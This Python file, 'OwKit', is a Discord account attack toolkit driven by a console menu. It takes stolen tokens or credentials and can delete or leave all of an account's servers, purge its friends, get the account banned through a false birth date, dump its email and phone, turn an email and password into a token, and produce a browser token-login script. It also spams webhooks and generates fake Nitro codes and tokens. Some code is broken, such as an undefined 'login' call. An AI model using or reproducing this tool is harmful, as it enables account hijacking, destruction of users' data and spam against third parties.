import requests
import discord
import os
import sys
import colorama
import threading
from itertools import cycle
from datetime import datetime
from colorama import Fore, init, Style
import ctypes
import urllib
import time
import json
import random
import string
import itertools
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
from itertools import cycle
import base64
from random import randint
from time import gmtime, sleep, strftime
from discord.ext import commands
from discord.ext.commands import Bot
import keyboard
import aiohttp
import re, os
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
import psutil


#snipper
def Spinner():
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Loading')
    os.system('cls')
    l = ['|', '/', '-', '\\']
    for i in l+l+l+l+l+l+l+l+l+l+l+l+l:
        sys.stdout.write('\r' + f'{Fore.CYAN}{Style.BRIGHT}[*] Loading... '+i)
        sys.stdout.flush()
        time.sleep(0.2)

Spinner()

#start of methods
def nuketoken():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Nuke Token')
  print(f'''
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
        ''')

  token = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Token: ')
  headers = {'Authorization': token, 'Content-Type': 'application/json'}  
  r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
  if r.status_code == 200:
    amount = int(input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Guild Amount: '))
    name = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Guild Name: ')
    print('')
    print('')
    print(f'{Fore.GREEN}Token is valid.{Fore.RESET}')
    try:
      bot = commands.Bot(command_prefix='-', self_bot=True)
      bot.remove_command("help")

      @bot.event
      async def on_ready(times : int=100):

        print("Leaving Guilds")
        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'Left: [{guild.name}]')
            except:
                print(f'Failed: [{guild.name}]')
        print("")

        print("Deleting Guilds")
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'Deleted Guild: [{guild.name}]')
            except:
                print(f'Failed: [{guild.name}]')
        print("")

        print("Removing Relationships")
        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'Removed Relationship: {user}')
            except:
                print(f"Failed: {user}")
        print("")

        print("Creating Guilds")
        for i in range(amount):
            await bot.create_guild(f'{name}', region=None, icon=None)
            print(f'Server Created: [{i}]')
        print("")

        print(f'{Fore.GREEN}Successfully nuked token{Fore.RESET}')
        input(f'Press [Enter] key to go back to Main Menu.')
        mainMenu()

      bot.run(token, bot=False)
    except ValueError:
      print(f'{Fore.RED}Invalid choice{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
  else:
    print(f'{Fore.RED}Invalid token{Fore.RESET}')
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        os.system('cls')
        mainMenu()
def unverifytoken():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Unverify Token')
    print(f'''   

     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')

    token = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        r = requests.post('https://discordapp.com/api/v8/users/@me/relationships', headers={'Authorization': token, 'User-Agent': 'discordbot'}, json={'username': 'LMAO', 'discriminator': 6572})
        if r.status_code == 204:
            print(f'{Fore.GREEN}Successfully unverified token{Fore.RESET}')
            print(f'Press [Enter] key to go back to Main Menu.')
            while True:
              if keyboard.is_pressed('enter'):
                os.system('cls')
                mainMenu()
        else:
          print(f'{Fore.RED}Failed to unverify token{Fore.RESET}')
          print(f'Press [Enter] key to go back to Main Menu.')
          while True:
            if keyboard.is_pressed('enter'):
              os.system('cls')
              mainMenu()
    else:
        print(f'{Fore.RED}Invalid token{Fore.RESET}')
        print(f'Press [Enter] key to go back to Main Menu.')
        while True:
          if keyboard.is_pressed('enter'):
            os.system('cls')
            mainMenu()
def bantoken():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Ban Token')
    print(f'''
                                                               
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')


    token = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        r = requests.patch('https://discordapp.com/api/v8/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
        if r.status_code == 400:
          print(f'{Fore.GREEN}Successfully banned token{Fore.RESET}')
          print(f'Press [Enter] key to go back to Main Menu.')
          while True:
            if keyboard.is_pressed('enter'):
              os.system('cls')
              mainMenu()
        else:
          print(f'{Fore.RED}Failed to ban token{Fore.RESET}')
          print(f'Press [Enter] key to go back to Main Menu.')
          while True:
            if keyboard.is_pressed('enter'):
              os.system('cls')
              mainMenu()
    else:
        print(f'{Fore.RED}Invalid token{Fore.RESET}')
        input('Press [Enter] key to go back to Main Menu.')
        mainMenu()
        os.system('cls')
def tokenfromuserid():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Half Token From User ID')
    print(f'''                                                  
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')


    userid = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} ID: ')
    string_b = f"{userid}".encode('utf')
    bas64_bytes = base64.b64encode(string_b)
    print(bas64_bytes.decode('utf-8'))
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        os.system('cls')
        mainMenu()
def tokenvalidator():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Token Validator')
    print(f'''                                                    
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')


    token = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        print(f'{Fore.GREEN}Token valid{Fore.RESET}')
        print(f'Press [Enter] key to go back to Main Menu.')
        while True:
          if keyboard.is_pressed('enter'):
            os.system('cls')
            mainMenu()
    else:
        print(f'{Fore.RED}Invalid token.{Fore.RESET}')
        print(f'Press [Enter] key to go back to Main Menu.')
        while True:
          if keyboard.is_pressed('enter'):
            os.system('cls')
            mainMenu()
def hypesquad():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Hypesquad Changer')
    print(f'''
                {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
                {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
                {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
               
            ''')
    print(f"""

        {Fore.MAGENTA}(1){Fore.RESET} Bravery
        {Fore.MAGENTA}(2){Fore.RESET} Brilliance
        {Fore.MAGENTA}(3){Fore.RESET} Balance
        """)

    house = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Your choice: ')
    token = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:

      headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
      if house == "1":
          payload = {'house_id': 1}
      elif house == "2":
          payload = {'house_id': 2}
      elif house == "3":
          payload = {'house_id': 3}
      r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
      if r.status_code == 204:
        print(f"{Fore.GREEN}Successfully changed your token hypesquad{Fore.RESET}")
        print(f'Press [Enter] key to go back to Main Menu.')
        while True:
          if keyboard.is_pressed('enter'):
            os.system('cls')
            mainMenu()
    else:
      print(f'{Fore.RED}Invalid token{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
def nitrogen():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Nitro Generator')
    print(f'''
                {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
                {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
                {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴                     
            ''')
    try:
      amount = int(input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Amount: '))
      value = 1
      while value <= amount:
        code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
        f = open(f'Nitro codes ({amount}).txt', "a+")
        f.write(f'{code}\n')
        f.close()
        print(f'{code}')
        value += 1
      print('')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
    except ValueError:
      print(f'{Fore.RED}Invalid choice{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
def tokengen():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Token Generator')
  print(f'''
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')

  try:
    amount = int(input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Amount: '))
    value = 1
    while value <= amount:
      code = "Nz" + ('').join(random.choices(string.ascii_letters + string.digits, k=59))
      f = open(f'Tokens ({amount}).txt', "a+")
      f.write(f'{code}\n')
      f.close()
      print(f'{code}')
      value += 1
    print('')
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        os.system('cls')
        mainMenu()
  except ValueError:
    print(f'{Fore.RED}Invalid choice{Fore.RESET}')
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        os.system('cls')
        mainMenu()
def trolltoken():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Troll Token')
    print(f'''                                                     
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')


    token = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:

      amount = int(input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Amount: '))
      modes = cycle(["light", "dark"])

      for i in range(amount):
        t = threading.Thread(target=trolltoken, args=(i,))
        print(f'{Fore.GREEN}Token has been trolled [{i}]')
        time.sleep(0.12)
        setting = {'theme': next(modes)}
        requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
      print(f'{Fore.GREEN}Finished trolling{Fore.RESET}')
      print('Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    else:
      print(f'{Fore.RED}Invalid choice{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
def tokeninfo():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Token Info')
    print(f'''
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')
 

    token = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
      print(f'{Fore.GREEN}Token is valid.{Fore.RESET}')
      userName = r.json()['username'] + '#' + r.json()['discriminator']
      userID = r.json()['id']
      phone = r.json()['phone']
      email = r.json()['email']
      mfa = r.json()['mfa_enabled']
      verified = r.json()['verified']
      print(f'''
User: {userName}
ID: {userID}
Phone: {phone}
Email: {email}
MFA: {mfa}
Verified: {verified}
Token: {token}
            ''')

      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    else:
      print(f'{Fore.RED}Invalid token{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      if keyboard.is_pressed('enter'):
        mainMenu()
        os.system('cls')
def informations():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Informations & contact')
    print(f'''                                     
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')


    fh = open('Information & contact.txt', 'w', encoding='utf-8')
    fh.write("""
        Discord User: Monster CAT
        Github: https://github.com/H23ninezerozerozero
        """)
    fh.close()
    print(f""" 
        Discord User: Monster CAT
        Github: https://github.com/H23ninezerozerozero
        """)
    input('Press [Enter] key to go back to Main Menu.')
    mainMenu()
def tokenfetcher():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Get token from email:password')
    print(f'''
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')


    email = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Email: ')
    password = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Password: ')
    data={'email': email, 'password': password, 'undelete': "false"}
    headers={'content-type': "application/json", 'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"}
    r = requests.post('https://discord.com/api/v8/auth/login', json=data, headers=headers)
    if r.status_code == 200:
        token = r.json()['token']
        print(f'Token: {token}')
        print(f'Press [Enter] key to go back to Main Menu.')
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    elif "PASSWORD_DOES_NOT_MATCH" in r.text:
        print(f'{Fore.RED}Invalid Password{Fore.RESET}')    
        print(f'Press [Enter] key to go back to Main Menu.')
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    elif "captcha-required" in r.text:
        print(f'{Fore.RED}Discord returned captcha{Fore.RESET}')   
        print(f'Press [Enter] key to go back to Main Menu.')
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    else:
      print(f'{Fore.RED}Invalid choice{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
def checkwebhook():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Check Webhook')
  print(f'''
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')

  webhook = input(f'\n\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET}Webhook: ')
  message = ('_ _')
  try:
    _data = requests.post(webhook, json={'content': message}, headers={'Content-Type': 'application/json'})
    if _data.status_code < 400:
      print(f'\n{Fore.GREEN}Webhook valid{Fore.RESET}')
      input('Press [Enter] key to go back to Main Menu.')
      mainMenu()
  except:
    print(f'\n\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET}Invalid Webhook')
    input('Press [Enter] key to go back to Main Menu.')
    mainMenu()


def spamwebhook():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Spam Webhook')
  print(f'''
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')

  webhook = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Webhook: ')
  message = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Message: ')
  amount = int(input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Amount:'))

  try:
    for i in range(amount):
      _data = requests.post(webhook, json={'content': message}, headers={'Content-Type': 'application/json'})
      if _data.status_code < 400:
        print(f'Sent new message [{i}]')
    input('Press [Enter] key to go back to Main Menu.')
    mainMenu()
  except:
    print(f'\n\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET}Invalid Webhook\n')
    input('Press [Enter] key to go back to Main Menu.')
    mainMenu()

def tokenlogin():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Token Informations')
  print(f'''
     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴  
                                          
            ''')



  token = input(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET} Token: ')
  headers = {'Authorization': token, 'Content-Type': 'application/json'}  
  r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
  if r.status_code == 200:
    fh = open('Token Login Script.txt', 'w', encoding='utf-8')
    fh.write('''
      function login(token) {
      setInterval(() => {
      document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
      }, 50);
      setTimeout(() => {
      location.reload();
      }, 2500);
      }'''
      + login('{token}'))

    fh.close()
    input('Press [Enter] key to go back to Main Menu.')
    mainMenu()
  else:
    print(f"{Fore.RED}Invalid token{Fore.RESET}")
    input('Press [Enter] key to go back to Main Menu.')
    mainMenu()



def getBanner():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster CAT | Main Menu')
    banner = f'''

                                     {Fore.MAGENTA}╔═╗┬ ┬╔╦╗┌─┐┌─┐┬  ╦╔═┬┌┬┐
                                     {Fore.LIGHTMAGENTA_EX}║ ║│││ ║ │ ││ ││  ╠╩╗│ │ 
                                     {Fore.LIGHTWHITE_EX}╚═╝└┴┘ ╩ └─┘└─┘┴─┘╩ ╩┴ ┴ 

                
                \u001b[38;5;141m[\u001b[38;5;141m1\u001b[38;5;141m] \u001b[38;5;15mGet token from email:password          \u001b[38;5;141m[\u001b[38;5;141m9\u001b[38;5;141m] \u001b[38;5;15mChange Hypesquad house    
                \u001b[38;5;141m[\u001b[38;5;141m2\u001b[38;5;141m] \u001b[38;5;15mNuke token                             \u001b[38;5;141m[\u001b[38;5;141m10\u001b[38;5;141m] \u001b[38;5;15mToken validator          
                \u001b[38;5;141m[\u001b[38;5;141m3\u001b[38;5;141m] \u001b[38;5;15mBan token                              \u001b[38;5;141m[\u001b[38;5;141m11\u001b[38;5;141m] \u001b[38;5;15mSpam webhook             
                \u001b[38;5;141m[\u001b[38;5;141m4\u001b[38;5;141m] \u001b[38;5;15mTroll token                            \u001b[38;5;141m[\u001b[38;5;141m12\u001b[38;5;141m] \u001b[38;5;15mCheck webhook            
                \u001b[38;5;141m[\u001b[38;5;141m5\u001b[38;5;141m] \u001b[38;5;15mToken informations                     \u001b[38;5;141m[\u001b[38;5;141m13\u001b[38;5;141m] \u001b[38;5;15mGenerate nitro codes     
                \u001b[38;5;141m[\u001b[38;5;141m6\u001b[38;5;141m] \u001b[38;5;15mGet token from user id                 \u001b[38;5;141m[\u001b[38;5;141m14\u001b[38;5;141m] \u001b[38;5;15mGenerate tokens          
                \u001b[38;5;141m[\u001b[38;5;141m7\u001b[38;5;141m] \u001b[38;5;15mLogin on token                         \u001b[38;5;141m[\u001b[38;5;141m15\u001b[38;5;141m] \u001b[38;5;15mInformations & contact   
                \u001b[38;5;141m[\u001b[38;5;141m8\u001b[38;5;141m] \u001b[38;5;15mUnverify token                         \u001b[38;5;141m[\u001b[38;5;141m0\u001b[38;5;141m] \u001b[38;5;15mExit                     
                
    
    '''
    return banner

    

def mainMenu():
    print(getBanner())
    print(f'\u001b[38;5;93m:\u001b[38;5;15m>\u001b[38;5;93m:{Fore.RESET}', end=''); choice = str(input(' '))

    if choice == '1':
      tokenfetcher()

    elif choice == '2':
      nuketoken()

    elif choice == '3':
      bantoken()

    elif choice == '4':
      trolltoken()

    elif choice == '5':
      tokeninfo()

    elif choice == '6':
      tokenfromuserid()


    elif choice == '7':
      tokenlogin()

    elif choice == '8':
      unverifytoken()

    elif choice == '9':
      hypesquad()

    elif choice == '10':
      tokenvalidator()


    elif choice == '11':
      spamwebhook()

    elif choice == '12':

      checkwebhook()

    elif choice == '13':
      nitrogen()

    elif choice == '14':
      tokengen()

    elif choice == '0':
        exit()


    elif choice.isdigit() == False:
      mainMenu()

    else:
      mainMenu()   


if __name__ == '__main__':
    mainMenu()
